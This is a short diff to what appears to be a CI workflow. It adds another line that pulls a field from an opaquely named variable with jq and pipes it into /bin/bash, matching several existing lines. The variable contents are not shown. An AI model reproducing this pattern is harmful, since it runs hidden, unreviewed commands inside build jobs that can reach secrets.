@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$epcc5" | jq -r .daddh4 | /bin/bash
           echo $pku3 | jq -r .d33748 | /bin/bash
           printf '%s' "$gphm8" | jq -r .lgmkc01084 | /bin/bash
+          echo $edv57 | jq -r .yak7910 | /bin/bash
 
       - name: Save output
         if: always()
